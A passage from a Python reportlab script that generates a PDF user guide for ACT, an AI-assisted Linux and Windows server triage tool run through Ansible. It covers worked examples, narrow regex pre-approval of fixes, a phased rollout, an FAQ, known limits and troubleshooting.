    "example diagnose-only and add pre-approved patterns only once you trust the diagnoses.")])


def example(num, title, when, run, allow, see):
    rows = [["When", when], ["How to run", run]]
    if allow:
        rows.append(["Pre-approve (optional)", allow])
    rows.append(["What you will see", see])
    data = [[Paragraph(md("**%s**" % k), ST["cell"]), Paragraph(md(v), ST["cell"])] for k, v in rows]
    t = Table(data, colWidths=[CONTENT_W * 0.2, CONTENT_W * 0.8])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, -1), PANEL), ("BOX", (0, 0), (-1, -1), 0.5, LINE),
        ("LINEBELOW", (0, 0), (-1, -2), 0.4, LINE), ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("TOPPADDING", (0, 0), (-1, -1), 4.5), ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
    ]))
    head = Paragraph('<font name="Sans-Bold" color="#0E7C86">Example %d</font>   '
                     '<font name="Sans-Bold" color="#1B3A5C">%s</font>' % (num, escape(title)),
                     ParagraphStyle("exh", parent=ST["h3"], fontSize=11, spaceBefore=10, spaceAfter=4))
    return [head, t, space(4)]


EX = [
    ("A service is down: diagnose, and restart if that is enough",
     "`systemctl --failed` shows a unit (built into the role), or an alert fires.",
     "Role: `act_triage_units: [nginx]`. By hand: `act --non-interactive --result-file r.json "
     "\"nginx is down. Find the root cause.\"`",
     "`systemctl (reset-failed|restart) nginx(\\.service)?`",
     "The cause, from unit status and the journal: bad config, port in use, out of memory, a failed "
     "dependency. If a restart fixes it, it is restarted and verified (`completed`). If the config is "
     "broken, the edit is a manual fix and nothing is restarted blindly."),
    ("Disk filling up: find what is using the space",
     "The role's disk check trips (default 90%; set `act_triage_disk_threshold: 85` for earlier warning).",
     "The triage job as normal.",
     "`journalctl --vacuum-(size=[0-9]+M|time=[0-9]+d)`, `dnf clean all`",
     "Which directories or files are responsible (logs, package cache, journal, core dumps) and specific "
     "cleanup commands. Deletions are danger tier, so they always come back as manual fixes."),
    ("After patching: did anything break?",
     "Right after your patching job, as the next node in the patch workflow.",
     "`act_triage_always: true` and `act_triage_extra_instructions: \"This host was just patched and "
     "rebooted. Check every enabled service is running, listening ports match, and there are no new "
     "errors since boot.\"`",
     None,
     "A per-host \"healthy\" or a list of specific regressions (a service that did not come back, a port "
     "no longer listening, new errors), in one fleet report."),
    ("Nightly fleet health report",
     "Every night, as a read-only summary for the team.",
     "Schedule the triage template nightly with no patterns, plus a notification.",
     None,
     "One report listing only hosts that tripped a check, each with root cause and proposed fixes. "
     "Healthy hosts cost no model calls."),
    ("Web application not responding",
     "A health URL fails but the services look up.",
     "Add your own check to the play with the `uri` module, and pass its failure in "
     "`act_triage_findings_extra` (worked play in `docs/AUTOMATION_GUIDE.md`, recipe 9.5).",
     "`systemctl restart (nginx|php-fpm)`",
     "ACT starts from \"https://web01/healthz returned 502\" and follows it through proxy, application "
     "and back-end logs to the failing component."),
    ("SELinux is blocking something",
     "A service fails with permission errors after a deployment.",
     "Triage with `act_triage_extra_instructions: \"Check recent AVC denials (ausearch -m avc -ts "
     "recent).\"`",
     "`restorecon -Rv /var/www/html` (the exact path only)",
     "Which denial, which file label or boolean is involved, and the fix. Anything broader, such as a "
     "policy module, comes back for a person."),
    ("Clock drift / NTP",
     "Authentication or TLS errors that point at time.",
     "`act_triage_units: [chronyd]`",
     "`systemctl (restart|start) chronyd`, `chronyc makestep`",
     "Whether chrony is running, which time sources are reachable, the current offset, and a restart or "
     "clock step if needed, verified afterwards."),
    ("Summarize an error log (no commands run)",
     "You have a pile of log lines and want them grouped by cause.",
     "`journalctl -p err --since -24h | act --allow-piped-upload --result-file r.json \"Group these "
     "errors by root cause.\"`",
     None,
     "A grouped, prioritized summary in the result file's `summary`. ACT only analyzes the text; it runs "
     "nothing. The text is sent to the model, so check what the log contains first."),
    ("Windows: IIS or a Windows service is down",
     "Windows hosts, using ACT-Windows (`act.ps1`).",
     "`.\\act.ps1 -NonInteractive -Allow 'Restart-Service -Name (W3SVC|WAS)' -ResultFile C:\\Temp\\r.json "
     "\"IIS is not serving pages. Find the root cause.\"`",
     None,
     "The same result file format and statuses. The AAP role covers Linux today; "
     "`docs/AUTOMATION_GUIDE.md` has an example Windows play (a template, not yet tested)."),
]
for i, e in enumerate(EX, 1):
    story += example(i, *e)

# ============================================================================ 8. Rollout
story += section("8. Suggested rollout plan", [P(
    "Trust is earned in steps. Each phase has exit criteria; move on only when they are met."),
    figure(diagram_rollout(), "Figure 5. Rollout phases")])
story.append(table(["phase", "what", "exit criteria"], [
    ["**1. Pilot**", "Diagnose-only on a handful of non-production hosts, run by hand or from the triage "
                     "template. Compare ACT's diagnoses with what engineers found.",
     "Diagnoses are judged useful on real incidents. The data sent to the model is acceptable. "
     "Thresholds are tuned."],
    ["**2. Scheduled reports**", "Diagnose-only on a wider group, scheduled hourly or nightly, with "
                                 "notifications.",
     "The team reads and uses the reports. False-positive trips are rare. Model usage is within budget."],
    ["**3. Approval workflow**", "Triage > approval > apply for `proposed_commands`.",
     "Approved fixes verify successfully. Approvers are comfortable with the evidence shown."],
    ["**4. Narrow auto-fixes**", "Pre-approve a few repetitive, low-risk fixes (for example service "
                                 "restarts on stateless web servers). Review the list monthly.",
     "Ongoing: every pre-approved fix is visible in the results as `pre_approved` and verified."],
], [0.2, 0.44, 0.36]))

# ============================================================================ 9. FAQ
story += section("9. Frequently asked questions", [H3("Can it break our servers?"), P(
    "Not in diagnose-only mode: only proven read-only commands run. With pre-approved patterns it can "
    "run only the exact commands you listed, never danger-tier commands or file edits, and every fix "
    "must pass a verification check.")])
faq = [
    ("What if the AI is wrong?",
     "Diagnoses come with evidence and a confidence level. Fixes need a person's approval or a narrow "
     "pre-approval, and a fix is not reported as done until a read-only check proves it worked."),
    ("What data leaves our network?",
     "The task text and the output of the commands ACT runs (log lines, config snippets; from ACT "
     "0.6.18 with host names, IP addresses and accounts replaced by placeholders) "
     "go to the configured model endpoint (GenAI.mil or AskSage). Keys and command output are never "
     "written to the result file. Confirm what the endpoint is approved to receive."),
    ("What does it cost?",
     "Model usage follows problems, not fleet size: healthy hosts make no model calls, and each triage "
     "is capped at 30 steps and 15 minutes by default. Tune the check thresholds so routine noise does "
     "not trigger triage. On Linux, token usage is recorded in the result file when the provider "
     "reports it."),
    ("Can we audit what it did?",
     "Yes: a result file for every run (every command, how it was approved, its exit code, refused "
     "actions), an optional step-by-step audit log, the AAP job output, and AAP's approval records."),
    ("Does it need root?",
     "To read the full journal and to apply fixes, yes: the playbooks use `become`. A diagnose-only run "
     "can work as a user in the `systemd-journal` group, with less visibility."),
    ("Does it install anything on our hosts?",
     "One script, copied to `/opt/act/act`, which needs Python 3.8+. No agent, no daemon, no open ports."),
    ("What if the model endpoint is down?",
     "The run ends with status `error` (exit 3), AAP reports it, and nothing on the host changes."),
    ("Who controls what it may fix?",
     "Whoever owns the job templates in AAP. Pre-approved patterns live in the template or survey under "
     "AAP role-based access control, and should be reviewed like code."),
    ("What about Windows?",
     "ACT-Windows has the same unattended mode, pre-approval and result file. The AAP role is Linux-only "
     "today; an example Windows play is provided as a template."),
]
for q, a in faq:
    story += [H3(q), P(a)]

# ============================================================================ 10. Status and limits
story += section("10. Current status and limits", [callout("note", "Where things stand", [
    "ACT %s was released in %s for Linux and Windows. Its automated test suites pass on Linux "
    "(Python 3.8, 3.11, 3.13) and Windows (PowerShell 5.1 and 7)." % (VERSION, DATE),
    "The unattended mode, pre-approval, result file, the Ansible role and both playbooks have been run "
    "end to end, but **against a simulated model endpoint**. They have not yet been exercised against "
    "GenAI.mil or AskSage in our environment. Phase 1 of the rollout is that first real-world test.",
])])
story += bullets([
    "**Templates, not yet tested:** the Windows Ansible play, the Event-Driven Ansible rulebook, and the "
    "exact AAP menu paths (they vary between AAP versions).",
    "**Linux hosts only** for the AAP role. Each host must be able to reach the model endpoint; if hosts "
    "are firewalled from it, the role cannot be used as is.",
    "**Model quality matters.** Diagnoses can be wrong or incomplete. Approval and verification are the "
    "safety net, not the model.",
    "**Approval is per workflow run**, not per host.",
    "**The default journal threshold** (50 error lines an hour) may trip on every run on busy hosts. "
    "Tune it before scheduling across the fleet.",
])

# ============================================================================ Appendix A
story.append(PageBreak())
story += section("Appendix A. Quick reference", [H2("Command-line options (Linux)"), table(
    ["option", "environment variable", "meaning"], [
        ["`--non-interactive`", "", "Never prompt; refuse and report anything that needs approval."],
        ["`--allow REGEX` (repeatable)", "`ACT_ALLOW` (one per line)", "Pre-approve matching commands."],
        ["`--result-file PATH`", "`ACT_RESULT_FILE`", "Write the result JSON (act.result/1)."],
        ["`--audit-log PATH`", "`ACT_AUDIT_LOG`", "Step-by-step JSONL record."],
        ["`--max-steps N`", "`GENAI_MAX_STEPS`", "Step budget."],
        ["`--provider NAME`", "`ACT_PROVIDER`", "`genai`, `asksage` or `genai-beta`."],
        ["`--allow-piped-upload`", "", "Allow sending piped text to the model."],
    ], [0.3, 0.27, 0.43])])
story.append(P("Windows (`act.ps1`): `-NonInteractive`, `-Allow` (or `ACT_ALLOW`), `-ResultFile` (or "
               "`ACT_RESULT_FILE`), `-Provider`, `-Model`. Several `-Allow` patterns cannot be passed "
               "through `powershell -File`; use `ACT_ALLOW` instead.", "small"))
story.append(H2("Role variables you will use"))
story.append(table(["variable", "default", "what it does"], [
    ["`act_triage_allow`", "`[]`", "Fix patterns ACT may run unattended."],
    ["`act_triage_allow_lines`", "", "Same, as one pattern per line (act_triage.yml; for AAP surveys)."],
    ["`act_triage_units`", "`[]`", "Units that must be active."],
    ["`act_triage_disk_threshold`", "`90`", "Percent used that counts as a finding."],
    ["`act_triage_journal_error_threshold`", "`50`", "Error lines per hour that count; `0` turns it off."],
    ["`act_triage_findings_extra`", "`[]`", "Your own findings (URL checks, application probes)."],
    ["`act_triage_always`", "`false`", "Run ACT even when every check passes."],
    ["`act_triage_extra_instructions`", "`\"\"`", "Extra text for the prompt."],
    ["`act_triage_env`", "`{}`", "Non-secret ACT settings, e.g. `ACT_PROVIDER`, `ASKSAGE_MODEL`."],
    ["`act_triage_max_steps` / `_timeout`", "`30` / `900`", "Step budget / seconds per host."],
    ["`act_triage_fail_on`", "`[error]`", "Statuses that mark the host failed in AAP."],
], [0.43, 0.12, 0.45]))
story.append(space(8))
story.append(H2("Files in the ACT-Linux repository"))
story.append(table(["path", "what"], [
    ["`act`", "The tool."],
    ["`docs/AUTOMATION_GUIDE.md`", "Detailed step-by-step guide and cookbook."],
    ["`docs/RESULT_FILE.md`", "Result file specification."],
    ["`ansible/roles/act_triage/`", "The role."],
    ["`ansible/playbooks/act_triage.yml`", "Triage playbook."],
    ["`ansible/playbooks/act_apply_approved.yml`", "Apply-approved playbook (approval workflow)."],
    ["`examples/act-healthcheck.sh`, `examples/systemd/`", "Scheduled single-host health check."],
], [0.46, 0.54]))

# ============================================================================ Appendix B
story += section("Appendix B. Troubleshooting", [table(["symptom", "cause", "fix"], [
    ["`error`, exit 2, \"No API key is configured\"", "Key not in the environment.",
     "Attach the ACT model key credential; for AskSage also set `ACT_PROVIDER: asksage` in "
     "`act_triage_env`."],
    ["Exit 2, \"invalid --allow pattern\"", "Regular-expression syntax error.",
     "Fix the pattern; escape `( ) . +` where you mean them literally."],
    ["`error`, exit 3, network or TLS error", "Host cannot reach the endpoint, or an internal CA.",
     "Open egress; set `GENAI_CA` to the CA bundle path."],
    ["Role fails \"ACT needs Python 3.8+\"", "RHEL 8 default Python 3.6.", "`dnf install python3.11`."],
    ["Always `needs_approval` for a fix you expected to run",
     "The pattern does not match the model's exact command, or the command can never be pre-approved.",
     "Compare with `denied[].command`; check `pre_approvable` (quotes, pipes, `&&`, `rm -f` never "
     "qualify)."],
    ["`stopped`, \"reached the step limit\"", "Task too broad or the model looping.",
     "Narrow the task; raise `act_triage_max_steps`."],
    ["`ASYNC FAILED` on the ACT task", "ACT exited 4 (normal for `needs_approval`).",
     "Expected; the outcome comes from the result file."],
    ["\"ACT produced no result\"", "Timed out, or ACT could not start.",
     "Raise `act_triage_timeout`; rerun with `no_log` off on the run task to see output."],
    ["Healthy hosts keep calling the model", "Journal threshold too low.",
     "Raise `act_triage_journal_error_threshold`, or set it to 0."],
    ["A quoted or chained fix is never applied", "By design: it is a manual fix.",
     "Apply it by hand, or ask for a plain single command."],
], [0.31, 0.3, 0.39])])


def build():
    doc = GuideDoc(OUT)
    doc.multiBuild(story)
    print("wrote", OUT)


if __name__ == "__main__":
    build()
